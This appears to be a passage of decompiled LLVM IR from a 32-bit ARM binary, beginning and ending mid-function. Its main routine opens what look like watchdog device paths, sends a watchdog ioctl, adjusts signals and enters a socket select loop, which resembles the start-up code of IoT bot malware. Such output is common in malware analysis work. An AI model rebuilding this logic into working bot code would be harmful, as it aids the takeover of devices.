  %v9_f408 = icmp eq i32 %v3_f404, %v1_f408
  br i1 %v9_f408, label %dec_label_pc_f3ac, label %bb21

bb21:                                             ; preds = %dec_label_pc_f404
  %v2_f410 = trunc i32 %v1_f408 to i8
  store i8 %v2_f410, i8* bitcast (i8** @global_var_1e248.118 to i8*), align 4
  br label %dec_label_pc_f3ac

; uselistorder directives
  uselistorder i32 %v3_f2d0, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 3, 2 }
  uselistorder i32 (i32)* @function_e544, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_13674, { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1e248.118 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_1e248.118, { 1, 0 }
  uselistorder label %dec_label_pc_f3ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f398, { 1, 2, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_f424(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_f424:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %tmp13 = call i8 @__decompiler_undefined_function_1()
  %tmp19 = call i8 @__decompiler_undefined_function_1()
  %tmp23 = call i8 @__decompiler_undefined_function_1()
  %tmp27 = call i8 @__decompiler_undefined_function_1()
  %tmp31 = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i8 @__decompiler_undefined_function_1()
  %tmp35 = call i8 @__decompiler_undefined_function_1()
  %tmp37 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1616 = alloca i32, align 4
  %stack_var_-38 = alloca i8, align 1
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-592 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-170 = alloca i32, align 4
  %stack_var_-138 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-106 = alloca i8, align 1
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-464 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f424 = load i32, i32* @r4, align 4
  store i32 %v3_f424, i32* %stack_var_-36, align 4
  %v6_f424 = load i32, i32* @r5, align 4
  %v2_f434 = ptrtoint i32* %stack_var_-464 to i32
  store i32 %v2_f434, i32* @r4, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_f43c = load i32, i32* %arg2, align 4
  store i32 %tmp, i32* @r6, align 4
  %v1_f444 = inttoptr i32 %v2_f43c to i8*
  %v2_f444 = call i32 @function_13198(i8* %v1_f444)
  store i32 %v2_f434, i32* @r0, align 4
  %v1_f44c = call i32 @function_13804(i32 %v2_f434)
  store i32 %v2_f434, i32* @r0, align 4
  %v2_f458 = call i32 @function_137d4(i32 %v2_f434, i32 2)
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f468 = bitcast i32* %stack_var_-464 to %_TYPEDEF_sigset_t*
  %v4_f468 = call i32 @function_13118(i32 0, %_TYPEDEF_sigset_t* %v3_f468, i32 0)
  %v2_f474 = call i32 @function_1381c(i32 17, i32 1)
  %v2_f480 = call i32 @function_1381c(i32 5, i32 ptrtoint (i32* @global_var_f248.121 to i32))
  %v4_f48c = call i32 @function_12fc8(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_157b0.123, i32 0, i32 0), i32 2)
  %v7_f490 = icmp eq i32 %v4_f48c, -1
  store i32 %v4_f48c, i32* @r4, align 4
  br i1 %v7_f490, label %dec_label_pc_f814, label %dec_label_pc_f49c

dec_label_pc_f49c:                                ; preds = %dec_label_pc_f814, %dec_label_pc_f424
  %v0_f4b0 = phi i32 [ %v4_f81c, %dec_label_pc_f814 ], [ %v4_f48c, %dec_label_pc_f424 ]
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_f4b4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_f4b4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v5_f4bc = call i32 @function_12f4c(i32 %v0_f4b0, i32 -2147199228, i32 %v2_f4b4, i32 1, i32 1)
  %v0_f4c0 = load i32, i32* @r4, align 4
  %v1_f4c4 = call i32 @function_12e9c(i32 %v0_f4c0)
  br label %dec_label_pc_f4c8

dec_label_pc_f4c8:                                ; preds = %dec_label_pc_f814, %dec_label_pc_f49c
  %v2_f4cc = call i32 @function_12e70(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_15760.23, i32 0, i32 0))
  %v0_f4d0 = call i32 @function_12794()
  store i32 ptrtoint (i32* @global_var_1e46c.86 to i32), i32* @fp, align 4
  store i32 ptrtoint (i8** @global_var_1e478.111 to i32), i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_f4ec = ptrtoint i8* %stack_var_-106 to i32
  store i32 2, i32* @r7, align 4
  store i8 80, i8* bitcast (i32* @global_var_1e47b.113 to i8*), align 4
  store i32 902487617, i32* @global_var_1e47c.112, align 4
  store i8 0, i8* bitcast (i32* @global_var_1e47a.114 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1e479.128 to i8*), align 4
  store i32 %v0_f4d0, i32* @global_var_1e46c.86, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15804.130 to i32), i32* @r1, align 4
  store i32 18, i32* @r2, align 4
  store i8 2, i8* bitcast (i8** @global_var_1e478.111 to i8*), align 4
  store i32 %v2_f4ec, i32* @r0, align 4
  %v0_f518 = load i32, i32* @r6, align 4
  %v1_f518 = inttoptr i32 %v0_f518 to i32*
  %v2_f518 = load i32, i32* %v1_f518, align 4
  store i32 %v2_f518, i32* @r5, align 4
  %v4_f51c = call i32 @function_134b0(i32 %v2_f4ec, i32 ptrtoint ([3 x i8]* @global_var_15804.130 to i32), i32 18)
  store i32 ptrtoint (i32* @global_var_15800.145 to i32), i32* @r4, align 4
  %v13_f53c = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v13_f53c, i32* @lr, align 4
  store i32 add (i32 add (i32 ptrtoint (i32* @global_var_11b50.140 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_f2b4.133 to i32), i32 ptrtoint (i32* @global_var_11c08.135 to i32)), i32 72484), i32 ptrtoint (i32* @global_var_11cc0.138 to i32))), i32 151060), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_f248.121 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_f248.121 to i32), i32* %stack_var_-176, align 4
  br i1 icmp eq (i32 add (i32 add (i32 ptrtoint (i32* @global_var_11b50.140 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_f2b4.133 to i32), i32 ptrtoint (i32* @global_var_11c08.135 to i32)), i32 72484), i32 ptrtoint (i32* @global_var_11cc0.138 to i32))), i32 151060), i32 0), label %dec_label_pc_f718, label %dec_label_pc_f584

dec_label_pc_f584:                                ; preds = %dec_label_pc_f4c8
  %v3_f584 = load i8, i8* %stack_var_-106, align 1
  %v4_f584 = sext i8 %v3_f584 to i32
  store i32 %v4_f584, i32* %r2.global-to-local, align 4
  %v4_f588 = zext i8 %tmp37 to i32
  store i32 %v4_f588, i32* %r3.global-to-local, align 4
  %v0_f58c = load i32, i32* @r5, align 4
  store i8 %tmp37, i8* %stack_var_-72, align 1
  %v1_f598 = inttoptr i32 %v0_f58c to i8*
  %v2_f598 = call i32 @function_124dc(i8* %v1_f598)
  %v0_f5a0 = load i32, i32* @r7, align 4
  %v2_f5a4 = call i32 @function_12cc4(i32 %v0_f5a0, i32 %v2_f598)
  %v4_f5a8 = zext i8 %tmp35 to i32
  store i32 %v4_f5a8, i32* %r2.global-to-local, align 4
  %v4_f5ac = zext i8 %tmp34 to i32
  store i32 %v4_f5ac, i32* %r3.global-to-local, align 4
  %v0_f5b0 = load i32, i32* @r5, align 4
  %v2_f5b0 = add i32 %v0_f5b0, %v2_f5a4
  %v3_f5b0 = inttoptr i32 %v2_f5b0 to i8*
  %v4_f5b0 = load i8, i8* %v3_f5b0, align 1
  %v6_f5b0 = zext i8 %v4_f5b0 to i32
  store i32 %v6_f5b0, i32* %r4.global-to-local, align 4
  %v1_f5c0 = inttoptr i32 %v0_f5b0 to i8*
  %v2_f5c0 = call i32 @function_124dc(i8* %v1_f5c0)
  %v2_f5cc = call i32 @function_12cc4(i32 4, i32 %v2_f5c0)
  %v1_f5d0 = sub nuw nsw i32 -1, %v6_f5b0
  store i32 %v1_f5d0, i32* %r4.global-to-local, align 4
  %v0_f5d4 = load i32, i32* @r5, align 4
  %v2_f5d4 = add i32 %v0_f5d4, %v2_f5cc
  %v3_f5d4 = inttoptr i32 %v2_f5d4 to i8*
  %v4_f5d4 = load i8, i8* %v3_f5d4, align 1
  %v6_f5d4 = zext i8 %v4_f5d4 to i32
  %v4_f5d8 = zext i8 %tmp31 to i32
  store i32 %v4_f5d8, i32* %r2.global-to-local, align 4
  %v1_f5e0 = sub nuw nsw i32 -82, %v6_f5b0
  %v1_f5e4 = sub nuw nsw i32 -1, %v6_f5d4
  store i32 %v1_f5e4, i32* %r3.global-to-local, align 4
  %v1_f5ec = urem i32 %v1_f5e0, 256
  %v2_f5f0 = add nsw i32 %v1_f5ec, %v1_f5e4
  store i32 %v2_f5f0, i32* %r4.global-to-local, align 4
  %v1_f5fc = inttoptr i32 %v0_f5d4 to i8*
  %v2_f5fc = call i32 @function_124dc(i8* %v1_f5fc)
  %v2_f608 = call i32 @function_12cc4(i32 6, i32 %v2_f5fc)
  %v0_f60c = load i32, i32* @r5, align 4
  %v2_f60c = add i32 %v0_f60c, %v2_f608
  %v3_f60c = inttoptr i32 %v2_f60c to i8*
  %v4_f60c = load i8, i8* %v3_f60c, align 1
  %v6_f60c = zext i8 %v4_f60c to i32
  %v4_f610 = zext i8 %tmp27 to i32
  store i32 %v4_f610, i32* %r2.global-to-local, align 4
  %v1_f618 = sub nuw nsw i32 -1, %v6_f60c
  store i32 %v1_f618, i32* %r3.global-to-local, align 4
  %v0_f620 = load i32, i32* %r4.global-to-local, align 4
  %v1_f620 = urem i32 %v0_f620, 256
  %v2_f624 = add nsw i32 %v1_f620, %v1_f618
  store i32 %v2_f624, i32* %r4.global-to-local, align 4
  %v1_f630 = inttoptr i32 %v0_f60c to i8*
  %v2_f630 = call i32 @function_124dc(i8* %v1_f630)
  %v2_f63c = call i32 @function_12cc4(i32 8, i32 %v2_f630)
  %v0_f640 = load i32, i32* @r5, align 4
  %v2_f640 = add i32 %v0_f640, %v2_f63c
  %v3_f640 = inttoptr i32 %v2_f640 to i8*
  %v4_f640 = load i8, i8* %v3_f640, align 1
  %v6_f640 = zext i8 %v4_f640 to i32
  %v4_f644 = zext i8 %tmp23 to i32
  store i32 %v4_f644, i32* %r2.global-to-local, align 4
  %v1_f64c = sub nuw nsw i32 -1, %v6_f640
  store i32 %v1_f64c, i32* %r3.global-to-local, align 4
  %v0_f654 = load i32, i32* %r4.global-to-local, align 4
  %v1_f654 = urem i32 %v0_f654, 256
  %v2_f658 = add nsw i32 %v1_f654, %v1_f64c
  store i32 %v2_f658, i32* %r4.global-to-local, align 4
  %v1_f664 = inttoptr i32 %v0_f640 to i8*
  %v2_f664 = call i32 @function_124dc(i8* %v1_f664)
  %v2_f670 = call i32 @function_12cc4(i32 10, i32 %v2_f664)
  %v0_f674 = load i32, i32* @r5, align 4
  %v2_f674 = add i32 %v0_f674, %v2_f670
  %v3_f674 = inttoptr i32 %v2_f674 to i8*
  %v4_f674 = load i8, i8* %v3_f674, align 1
  %v6_f674 = zext i8 %v4_f674 to i32
  %v4_f678 = zext i8 %tmp19 to i32
  store i32 %v4_f678, i32* %r2.global-to-local, align 4
  %v1_f680 = sub nuw nsw i32 -1, %v6_f674
  store i32 %v1_f680, i32* %r3.global-to-local, align 4
  %v0_f688 = load i32, i32* %r4.global-to-local, align 4
  %v1_f688 = urem i32 %v0_f688, 256
  %v2_f68c = add nsw i32 %v1_f688, %v1_f680
  store i32 %v2_f68c, i32* %r4.global-to-local, align 4
  %v1_f698 = inttoptr i32 %v0_f674 to i8*
  %v2_f698 = call i32 @function_124dc(i8* %v1_f698)
  %v2_f6a4 = call i32 @function_12cc4(i32 12, i32 %v2_f698)
  %v0_f6a8 = load i32, i32* @r5, align 4
  %v2_f6a8 = add i32 %v0_f6a8, %v2_f6a4
  %v3_f6a8 = inttoptr i32 %v2_f6a8 to i8*
  %v4_f6a8 = load i8, i8* %v3_f6a8, align 1
  %v6_f6a8 = zext i8 %v4_f6a8 to i32
  %v0_f6ac = load i32, i32* %r4.global-to-local, align 4
  %v1_f6ac = urem i32 %v0_f6ac, 256
  %v1_f6b0 = sub nuw nsw i32 -1, %v6_f6a8
  store i32 %v1_f6b0, i32* %r3.global-to-local, align 4
  %v2_f6b4 = add nsw i32 %v1_f6ac, %v1_f6b0
  store i32 %v2_f6b4, i32* %r4.global-to-local, align 4
  %fold = add i32 %v0_f6ac, %v1_f6b0
  %v1_f6bc = urem i32 %fold, 256
  %v2_f6c0 = call i32 @function_12bf8(i32 %v1_f6bc, i32 9)
  %v1_f6c4 = load i32, i32* @r7, align 4
  %v6_f6c4 = shl i32 %v2_f6c0, %v1_f6c4
  %v2_f6cc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_f6cc, i32* %r2.global-to-local, align 4
  %v1_f6d0 = and i32 %v6_f6c4, 1020
  %v2_f6d8 = add i32 %v1_f6d0, %v2_f6cc
  %v2_f6dc = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_f6dc, i32* @r4, align 4
  store i32 63208, i32* @lr, align 4
  %v1_f6e4 = add i32 %v2_f6d8, -172
  %v2_f6e4 = inttoptr i32 %v1_f6e4 to i32*
  %v3_f6e4 = load i32, i32* %v2_f6e4, align 4
  call void @__pseudo_branch(i32 %v3_f6e4)
  %v0_f6e8 = load i32, i32* @r5, align 4
  %v2_f6f0 = inttoptr i32 %v0_f6e8 to i8*
  %v3_f6f0 = call i32 @function_128bc(i8* %v2_f6f0, i32 %v2_f6dc)
  store i32 %v3_f6f0, i32* @r5, align 4
  %v2_f700 = call i32 @function_1257c(i32 %v2_f4ec, i32 18)
  %v2_f70c = call i32 @function_1257c(i32 %v2_f6dc, i32 12)
  %v0_f710 = load i32, i32* @r5, align 4
  %v1_f710 = urem i32 %v0_f710, 256
  %v2_f710 = icmp eq i32 %v1_f710, 0
  br i1 %v2_f710, label %dec_label_pc_f718, label %dec_label_pc_f830

dec_label_pc_f718:                                ; preds = %dec_label_pc_f584, %dec_label_pc_f4c8, %dec_label_pc_f830
  %v2_f71c = ptrtoint i32* %stack_var_-138 to i32
  store i32 %v2_f71c, i32* @sl, align 4
  %v0_f720 = call i32 @function_f2b4()
  %v1_f724 = call i32 @function_fe7c(i32 %v0_f720)
  %v2_f730 = call i32 @function_1257c(i32 %v2_f71c, i32 32)
  %v0_f734 = load i32, i32* @r8, align 4
  %v7_f734 = icmp eq i32 %v0_f734, 2
  br i1 %v7_f734, label %dec_label_pc_f83c, label %dec_label_pc_f73c

dec_label_pc_f73c:                                ; preds = %dec_label_pc_f83c, %dec_label_pc_f718, %dec_label_pc_f84c
  %v0_f73c = call i32 @function_fe24()
  %v1_f740 = mul i32 %v0_f73c, 4
  %v3_f744 = and i32 %v1_f740, 12
  %v2_f74c = ptrtoint i32* %stack_var_-170 to i32
  store i32 %v2_f74c, i32* @r5, align 4
  %v1_f750 = add nuw nsw i32 %v3_f744, 12
  store i32 %v1_f750, i32* @r4, align 4
  %v2_f75c = call i32 @function_fed8(i32 %v2_f74c, i32 %v1_f750)
  %v2_f764 = ptrtoint i32* %stack_var_-36 to i32
  %v1_f768 = load i32, i32* @r4, align 4
  %v2_f768 = add i32 %v1_f768, %v2_f764
  store i32 %v2_f768, i32* %r3.global-to-local, align 4
  %v0_f76c = load i32, i32* @r6, align 4
  %v1_f76c = inttoptr i32 %v0_f76c to i32*
  %v2_f76c = load i32, i32* %v1_f76c, align 4
  store i32 %v2_f76c, i32* @r0, align 4
  store i32 0, i32* @r6, align 4
  %v3_f774 = add i32 %v2_f768, -134
  %v4_f774 = inttoptr i32 %v3_f774 to i8*
  store i8 0, i8* %v4_f774, align 1
  %v2_f77c = inttoptr i32 %v2_f76c to i8*
  %v3_f77c = call i32 @function_12504(i8* %v2_f77c, i32 %v2_f74c)
  %v0_f780 = call i32 @function_fe24()
  %v2_f788 = call i32 @function_12bf8(i32 %v0_f780, i32 6)
  %v3_f78c = mul i32 %v2_f788, 4
  %v1_f790 = add i32 %v3_f78c, 12
  store i32 %v1_f790, i32* @r4, align 4
  %v2_f79c = call i32 @function_fed8(i32 %v2_f74c, i32 %v1_f790)
  store i32 %v2_f764, i32* %r2.global-to-local, align 4
  %v1_f7a8 = load i32, i32* @r4, align 4
  %v2_f7a8 = add i32 %v1_f7a8, %v2_f764
  store i32 %v2_f7a8, i32* %r3.global-to-local, align 4
  %v0_f7ac = load i32, i32* @r6, align 4
  %v1_f7ac = trunc i32 %v0_f7ac to i8
  %v3_f7ac = add i32 %v2_f7a8, -134
  %v4_f7ac = inttoptr i32 %v3_f7ac to i8*
  store i8 %v1_f7ac, i8* %v4_f7ac, align 1
  %v4_f7b8 = call i32 @function_13034(i32 15, i32 %v2_f74c, i32 %v2_f764, i32 %v2_f7a8)
  %v1_f7c0 = call i32 @function_11c08(i32 2)
  %v3_f7cc = call i32 @function_11b24(i32 2, i32* nonnull %stack_var_-44)
  %v3_f7d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f7d0, i32* %r2.global-to-local, align 4
  %v3_f7dc = inttoptr i32 %v3_f7cc to i32*
  %v4_f7dc = call i32 @function_131c4(i32 1, i32* %v3_f7dc, i32 %v3_f7d0)
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_f7ec = call i32 @function_131c4(i32 1, i32* nonnull @global_var_157d4.147, i32 1)
  %v1_f7f4 = call i32 @function_11b50(i32 2)
  %v0_f7f8 = call i32 @function_12ec8()
  %v1_f7fc = load i32, i32* @r6, align 4
  %v7_f800 = icmp sgt i32 %v0_f7f8, %v1_f7fc
  br i1 %v7_f800, label %dec_label_pc_f804, label %dec_label_pc_f874

dec_label_pc_f804:                                ; preds = %dec_label_pc_f73c
  %v2_f810 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f810, i32* %r4.global-to-local, align 4
  store i32 %v6_f424, i32* %r5.global-to-local, align 4
  ret i32 0

dec_label_pc_f814:                                ; preds = %dec_label_pc_f424
  %v4_f81c = call i32 @function_12fc8(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_157c0.149, i32 0, i32 0), i32 2)
  %v3_f820 = icmp eq i32 %v4_f81c, -1
  store i32 %v4_f81c, i32* @r4, align 4
  br i1 %v3_f820, label %dec_label_pc_f4c8, label %dec_label_pc_f49c

dec_label_pc_f830:                                ; preds = %dec_label_pc_f584
  %v1_f834 = call i32 @function_137bc(i32 5)
  br label %dec_label_pc_f718

dec_label_pc_f83c:                                ; preds = %dec_label_pc_f718
  %v0_f83c = load i32, i32* @r6, align 4
  %v1_f83c = add i32 %v0_f83c, 4
  %v2_f83c = inttoptr i32 %v1_f83c to i32*
  %v3_f83c = load i32, i32* %v2_f83c, align 4
  %v1_f840 = inttoptr i32 %v3_f83c to i8*
  %v2_f840 = call i32 @function_124dc(i8* %v1_f840)
  %v8_f848 = icmp sgt i32 %v2_f840, 31
  br i1 %v8_f848, label %dec_label_pc_f73c, label %dec_label_pc_f84c

dec_label_pc_f84c:                                ; preds = %dec_label_pc_f83c
  %v0_f84c = load i32, i32* @r6, align 4
  %v1_f84c = add i32 %v0_f84c, 4
  %v2_f84c = inttoptr i32 %v1_f84c to i32*
  %v3_f84c = load i32, i32* %v2_f84c, align 4
  store i32 %v2_f71c, i32* @r0, align 4
  %v2_f854 = bitcast i32* %stack_var_-138 to i8*
  %v3_f854 = call i32 @function_12504(i8* %v2_f854, i32 %v3_f84c)
  %v0_f858 = load i32, i32* @r6, align 4
  %v1_f858 = add i32 %v0_f858, 4
  %v2_f858 = inttoptr i32 %v1_f858 to i32*
  %v3_f858 = load i32, i32* %v2_f858, align 4
  store i32 %v3_f858, i32* %r4.global-to-local, align 4
  %v1_f860 = inttoptr i32 %v3_f858 to i8*
  %v2_f860 = call i32 @function_124dc(i8* %v1_f860)
  %v2_f86c = call i32 @function_1257c(i32 %v3_f858, i32 %v2_f860)
  br label %dec_label_pc_f73c

dec_label_pc_f874:                                ; preds = %dec_label_pc_f73c
  %v1_f874 = call i32 @function_130ec(i32 %v0_f7f8)
  %v0_f87c = load i32, i32* @r6, align 4
  %v1_f880 = call i32 @function_12e9c(i32 %v0_f87c)
  %v1_f888 = call i32 @function_12e9c(i32 1)
  %v1_f890 = call i32 @function_12e9c(i32 2)
  %v2_f894 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_f894, i32* @r7, align 4
  %v1_f898 = call i32 @function_a558(i32 %v1_f890)
  store i32 ptrtoint (i32* @global_var_1e240.151 to i32), i32* @sb, align 4
  %v1_f8a0 = call i32 @function_eab0(i32 %v1_f898)
  %v0_f8a4 = call i32 @function_10370()
  %v0_f8a8 = load i32, i32* @r6, align 4
  %v2_f8b0 = ptrtoint i32* %stack_var_-592 to i32
  store i32 %v2_f8b0, i32* @r6, align 4
  %v2_f8b4 = ptrtoint i32* %stack_var_-336 to i32
  store i32 %v2_f8b4, i32* @r7, align 4
  %v2_f994 = ptrtoint i32* %stack_var_-60 to i32
  %v5_fc50 = bitcast i8* %stack_var_-38 to i32*
  %v2_fb78 = ptrtoint i32* %stack_var_-1616 to i32
  %v2_fc68 = ptrtoint i32* %stack_var_-48 to i32
  %v2_fc6c = ptrtoint i32* %stack_var_-52 to i32
  %v1_fcfc = bitcast i32* %stack_var_-138 to i8*
  %v5_fcd0 = bitcast i32* %stack_var_-88 to %sockaddr*
  %v1_fce8 = sub i32 0, %v1_f874
  br label %dec_label_pc_f8b8

dec_label_pc_f8b8:                                ; preds = %dec_label_pc_f8b8.backedge, %dec_label_pc_f874
  %v2_f8c087 = phi i32 [ %v2_f8b0, %dec_label_pc_f874 ], [ %v2_f8c087.pre, %dec_label_pc_f8b8.backedge ]
  %stack_var_-37.0 = phi i8 [ %tmp13, %dec_label_pc_f874 ], [ %stack_var_-37.0.be, %dec_label_pc_f8b8.backedge ]
  %stack_var_-1620.0 = phi i32 [ %v0_f8a8, %dec_label_pc_f874 ], [ %stack_var_-1620.0.be, %dec_label_pc_f8b8.backedge ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_f8c089 = inttoptr i32 %v2_f8c087 to i32*
  store i32 0, i32* %v4_f8c089, align 4
  %v0_f8c490 = load i32, i32* %r3.global-to-local, align 4
  %v1_f8c491 = add i32 %v0_f8c490, 4
  store i32 %v1_f8c491, i32* %r3.global-to-local, align 4
  %v7_f8c892 = icmp eq i32 %v1_f8c491, 128
  br i1 %v7_f8c892, label %dec_label_pc_f8d0, label %dec_label_pc_f8c0.dec_label_pc_f8c0_crit_edge

dec_label_pc_f8c0.dec_label_pc_f8c0_crit_edge:    ; preds = %dec_label_pc_f8b8, %dec_label_pc_f8c0.dec_label_pc_f8c0_crit_edge
  %v1_f8c493 = phi i32 [ %v1_f8c4, %dec_label_pc_f8c0.dec_label_pc_f8c0_crit_edge ], [ %v1_f8c491, %dec_label_pc_f8b8 ]
  %v0_f8c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v2_f8c0 = load i32, i32* @r6, align 4
  %v3_f8c0 = add i32 %v2_f8c0, %v1_f8c493
  %v4_f8c0 = inttoptr i32 %v3_f8c0 to i32*
  store i32 %v0_f8c0.pre, i32* %v4_f8c0, align 4
  %v0_f8c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_f8c4 = add i32 %v0_f8c4, 4
  store i32 %v1_f8c4, i32* %r3.global-to-local, align 4
  %v7_f8c8 = icmp eq i32 %v1_f8c4, 128
  br i1 %v7_f8c8, label %dec_label_pc_f8d0, label %dec_label_pc_f8c0.dec_label_pc_f8c0_crit_edge

dec_label_pc_f8d0:                                ; preds = %dec_label_pc_f8c0.dec_label_pc_f8c0_crit_edge, %dec_label_pc_f8b8
  %v0_f8d0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f8d0, i32* %r3.global-to-local, align 4
  store i32 %v0_f8d0, i32* @r4, align 4
  %v2_f8d894 = load i32, i32* @r7, align 4
  %v3_f8d895 = add i32 %v2_f8d894, %v0_f8d0
  %v4_f8d896 = inttoptr i32 %v3_f8d895 to i32*
  store i32 %v0_f8d0, i32* %v4_f8d896, align 4
  %v0_f8dc97 = load i32, i32* %r3.global-to-local, align 4
  %v1_f8dc98 = add i32 %v0_f8dc97, 4
  store i32 %v1_f8dc98, i32* %r3.global-to-local, align 4
  %v7_f8e099 = icmp eq i32 %v1_f8dc98, 128
  br i1 %v7_f8e099, label %dec_label_pc_f8e8, label %dec_label_pc_f8d8.dec_label_pc_f8d8_crit_edge

dec_label_pc_f8d8.dec_label_pc_f8d8_crit_edge:    ; preds = %dec_label_pc_f8d0, %dec_label_pc_f8d8.dec_label_pc_f8d8_crit_edge
  %v1_f8dc100 = phi i32 [ %v1_f8dc, %dec_label_pc_f8d8.dec_label_pc_f8d8_crit_edge ], [ %v1_f8dc98, %dec_label_pc_f8d0 ]
  %v0_f8d8.pre = load i32, i32* @r4, align 4
  %v2_f8d8 = load i32, i32* @r7, align 4
  %v3_f8d8 = add i32 %v2_f8d8, %v1_f8dc100
  %v4_f8d8 = inttoptr i32 %v3_f8d8 to i32*
  store i32 %v0_f8d8.pre, i32* %v4_f8d8, align 4
  %v0_f8dc = load i32, i32* %r3.global-to-local, align 4
  %v1_f8dc = add i32 %v0_f8dc, 4
  store i32 %v1_f8dc, i32* %r3.global-to-local, align 4
  %v7_f8e0 = icmp eq i32 %v1_f8dc, 128
  br i1 %v7_f8e0, label %dec_label_pc_f8e8, label %dec_label_pc_f8d8.dec_label_pc_f8d8_crit_edge

dec_label_pc_f8e8:                                ; preds = %dec_label_pc_f8d8.dec_label_pc_f8d8_crit_edge, %dec_label_pc_f8d0
  store i32 ptrtoint (i32* @global_var_1e23c.116 to i32), i32* %r3.global-to-local, align 4
  %v2_f8ec = load i32, i32* @global_var_1e23c.116, align 4
  %v7_f8f0 = icmp eq i32 %v2_f8ec, -1
  br i1 %v7_f8f0, label %dec_label_pc_f920, label %dec_label_pc_f8f8

dec_label_pc_f8f8:                                ; preds = %dec_label_pc_f8e8
  %v3_f8f8 = udiv i32 %v2_f8ec, 32
  %v3_f900 = mul nuw nsw i32 %v3_f8f8, 4
  %v2_f908 = add i32 %v3_f900, %v2_f764
  store i32 %v2_f908, i32* %r3.global-to-local, align 4
  %v1_f90c = add i32 %v2_f908, -556
  %v2_f90c = inttoptr i32 %v1_f90c to i32*
  %v3_f90c = load i32, i32* %v2_f90c, align 4
  %v1_f910 = urem i32 %v2_f8ec, 32
  %v7_f918 = shl i32 1, %v1_f910
  %v8_f918 = or i32 %v3_f90c, %v7_f918
  store i32 %v8_f918, i32* %r2.global-to-local, align 4
  store i32 %v8_f918, i32* %v2_f90c, align 4
  br label %dec_label_pc_f920

dec_label_pc_f920:                                ; preds = %dec_label_pc_f8e8, %dec_label_pc_f8f8
  %v2_f920 = load i32, i32* @global_var_1e240.151, align 4
  store i32 %v2_f920, i32* %r3.global-to-local, align 4
  %v7_f924 = icmp eq i32 %v2_f920, -1
  store i32 ptrtoint (i32* @global_var_1e240.151 to i32), i32* @r8, align 4
  br i1 %v7_f924, label %dec_label_pc_fbc8, label %dec_label_pc_f930

dec_label_pc_f930:                                ; preds = %dec_label_pc_fbc8, %dec_label_pc_f920, %.thread
  store i32 ptrtoint (i8** @global_var_1e3dc.154 to i32), i32* %r2.global-to-local, align 4
  %v2_f934 = load i8, i8* bitcast (i8** @global_var_1e3dc.154 to i8*), align 4
  %v3_f934 = zext i8 %v2_f934 to i32
  store i32 %v3_f934, i32* %r3.global-to-local, align 4
  %v2_f938 = icmp eq i8 %v2_f934, 0
  %v2_fa88 = load i32, i32* @global_var_1e240.151, align 4
  %v3_fa90 = udiv i32 %v2_fa88, 32
  br i1 %v2_f938, label %dec_label_pc_fa88, label %dec_label_pc_f940

dec_label_pc_f940:                                ; preds = %dec_label_pc_f930
  %v3_f94c = mul nuw nsw i32 %v3_fa90, 4
  %v2_f954 = add i32 %v3_f94c, %v2_f764
  store i32 %v2_f954, i32* %r3.global-to-local, align 4
  %v1_f958 = add i32 %v2_f954, -300
  %v2_f958 = inttoptr i32 %v1_f958 to i32*
  %v3_f958 = load i32, i32* %v2_f958, align 4
  %v1_f95c = urem i32 %v2_fa88, 32
  %v7_f964 = shl i32 1, %v1_f95c
  %v8_f964 = or i32 %v3_f958, %v7_f964
  store i32 %v8_f964, i32* %r2.global-to-local, align 4
  store i32 %v8_f964, i32* %v2_f958, align 4
  br label %dec_label_pc_f96c

dec_label_pc_f96c:                                ; preds = %dec_label_pc_fa88, %dec_label_pc_f940
  %v2_f970 = load i32, i32* @global_var_1e23c.116, align 4
  %v2_f974 = load i32, i32* @global_var_1e240.151, align 4
  store i32 %v2_f974, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v5_f980 = icmp slt i32 %v2_f970, %v2_f974
